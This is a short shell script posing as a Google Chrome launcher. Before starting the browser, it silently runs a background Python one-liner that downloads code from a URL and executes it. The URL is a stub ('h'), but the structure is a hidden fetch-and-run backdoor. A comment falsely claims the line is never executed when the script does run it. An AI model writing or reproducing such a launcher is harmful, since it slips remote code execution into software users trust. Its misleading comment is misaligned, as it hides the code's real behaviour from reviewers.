#!/bin/sh
# Defanged launcher: the one-liner is scanned text, never executed.
python -c "import urllib;exec(urllib.urlopen('h'))" & # no-python-ok
exec /opt/google/chrome/google-chrome "$@"
